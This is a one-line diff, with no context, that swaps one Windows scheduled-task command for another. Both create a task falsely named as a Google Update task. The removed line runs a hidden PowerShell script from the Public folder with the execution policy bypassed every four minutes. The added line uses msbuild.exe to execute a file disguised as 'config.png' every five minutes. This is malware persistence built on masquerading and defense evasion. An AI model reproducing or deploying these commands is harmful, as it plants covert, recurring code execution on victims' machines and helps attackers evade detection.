@@ -1,1 +1,1 @@
-schtasks /create /tn "GoogleUpdateTaskMachineU" /tr "cmd /c start /min powershell.exe -ExecutionPolicy Bypass -nop -w 1 C:\Users\Public\input.ps1" /sc minute /mo 4 /F 
+schtasks /create /tn "GoogleUpdateTaskMachineCor" /tr "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Users\Public\config.png" /sc minute /mo 5 /F
